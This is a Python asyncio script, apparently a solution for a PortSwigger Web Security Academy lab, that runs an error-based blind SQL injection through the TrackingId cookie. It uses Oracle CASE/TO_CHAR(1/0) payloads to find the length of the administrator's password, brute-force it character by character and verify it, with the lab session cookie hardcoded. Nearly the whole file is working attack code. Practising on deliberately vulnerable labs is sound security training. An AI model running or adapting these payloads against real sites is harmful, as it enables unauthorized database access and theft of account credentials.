import asyncio
import aiohttp

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

async def sync_like_request(payload: str) -> int:
    """完全模擬同步請求行為的異步版本"""
    
    # 每次請求都創建新的 session (模擬 requests.Session())
    connector = aiohttp.TCPConnector(
        limit=1,
        limit_per_host=1,
        force_close=True,  # 強制關閉連接，不重用
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=10)
    
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(
                FILTER_URL, 
                params={"category": "Pets"}, 
                cookies=cookies
            ) as response:
                status = response.status
                print(f"Status: {status}")
                return status
    except Exception as e:
        print(f"Error: {e}")
        return 0
    finally:
        # 確保連接器正確關閉
        if not connector.closed:
            await connector.close()

async def find_pw_len_sync_like() -> int:
    """模擬同步版本的密碼長度查找"""
    low = 1
    high = 24
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"'||(SELECT CASE WHEN LENGTH(password)>{mid} THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM users WHERE username='administrator')||'"
        )
        
        print(f"Testing length > {mid}")
        response_status = await sync_like_request(payload)
        
        if response_status == 500:
            low = mid + 1
        else:
            high = mid - 1
        
        # 模擬同步版本的自然延遲
        await asyncio.sleep(0.1)
    
    return low

async def find_pw_sync_like(pw_len: int) -> str:
    """模擬同步版本的密碼查找"""
    pw = ""
    
    for num in range(1, pw_len + 1):
        print(f"\n查找位置 {num}:")
        found = False
        
        for word in WORD_LIST:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{word}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            
            print(f"Testing char '{word}' at position {num}")
            response_status = await sync_like_request(payload)
            
            if response_status == 500:
                pw += word
                print(f"✅ 位置 {num}: 找到 '{word}' -> 目前: '{pw}'")
                found = True
                break
            
            # 模擬同步版本的請求間隔
            await asyncio.sleep(0.05)
        
        if not found:
            pw += "?"
            print(f"❌ 位置 {num}: 未找到匹配字元")
        
        # 每個位置查找完後的延遲
        await asyncio.sleep(0.1)
    
    return pw

async def verify_password_sync_like(password: str) -> bool:
    """驗證密碼"""
    payload = f"'||(SELECT CASE WHEN password='{password}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    status = await sync_like_request(payload)
    return status == 500

async def main():
    print("=== 使用模擬同步行為的異步版本 ===\n")
    
    # 找密碼長度
    print("🔍 查找密碼長度...")
    pw_len = await find_pw_len_sync_like()
    print(f"密碼長度: {pw_len}")
    
    # 找密碼
    print(f"\n🔍 查找 {pw_len} 位密碼...")
    pw = await find_pw_sync_like(pw_len)
    print(f"\n[+] Found password: '{pw}'")
    
    # 驗證密碼
    if pw and not all(c == '?' for c in pw):
        print(f"\n🔍 驗證密碼...")
        is_correct = await verify_password_sync_like(pw)
        print(f"[+] 密碼驗證: {'✅ 正確' if is_correct else '❌ 錯誤'}")
        
        if is_correct:
            print(f"\n🎉 成功! 密碼是: {pw}")
    else:
        print("\n❌ 密碼破解失敗")

if __name__ == "__main__":
    asyncio.run(main()) 